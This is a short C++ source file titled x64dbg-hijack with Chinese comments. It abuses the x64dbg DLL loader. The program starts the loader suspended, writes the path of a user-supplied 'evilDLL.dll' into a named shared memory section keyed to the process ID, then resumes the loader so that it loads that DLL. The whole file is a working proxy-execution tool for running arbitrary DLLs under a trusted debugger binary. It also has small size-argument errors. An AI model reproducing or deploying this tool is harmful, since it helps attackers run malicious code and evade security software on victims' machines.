// x64dbg-hijack.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
// https://stackoverflow.com/questions/37333227/using-tprintf-for-tchar-argv0-and-getting-question-marks

#include <iostream>
#include <Windows.h>
#include <TCHAR.h>

#define BUFSIZE 4096


VOID GetFilePath(PTSTR filename, TCHAR buf[MAX_PATH]) {
    DWORD  retval = 0;
    retval = GetFullPathNameW(
        filename,
        BUFSIZ,
        buf,
        NULL  
    );
    if (retval == 0) {
        _tprintf(TEXT("[Error]: GetFullPathName Failed:[%d]\n"), GetLastError());
    }
    _tprintf(TEXT("[*]: the Full path of file is %s\n\n"), buf);
}   

int _tmain(int argc, TCHAR *argv[])
{
    if (argc != 3)
    {
        _tprintf(TEXT("Usage: %s <loaderdll.exe> <evilDLL.dll>\n"), argv[0]);
        return 0;
    }
    
    _tprintf(TEXT("the arguments : %s\n"), argv[1]);
    TCHAR dbgLoaderFile[MAX_PATH];
  

    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    GetFilePath(argv[1], dbgLoaderFile);
    if (!CreateProcess(
       dbgLoaderFile,
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        _tprintf(TEXT("CreateProcess Failed: %d\n"), GetLastError());
        return 0;
    }

    _tprintf(TEXT("Create Process Success: %d\n"), pi.dwProcessId);
    TCHAR evilDLL[MAX_PATH];
    TCHAR szName[MAX_PATH];
    GetFilePath(argv[2], evilDLL);
    

    wsprintfW(szName, L"Local\\szLibraryName%X", pi.dwProcessId);

    LPTSTR pBuffer;
    HANDLE hMap = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, sizeof(szName) + 1, szName);
    if (hMap == NULL) {
        _tprintf(TEXT("CreateFileMapping Failed: %d\n"), GetLastError());
        return 1;
    }
    pBuffer = (LPTSTR)MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);

    if (pBuffer == NULL) {
        _tprintf(TEXT("Could map view of file: %d\n"), GetLastError());
        CloseHandle(hMap);
        return 1;
    }
    wcscpy_s(pBuffer,sizeof(evilDLL), evilDLL);


    ResumeThread(pi.hThread);

    WaitForSingleObject(pi.hProcess, INFINITE);


    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

}
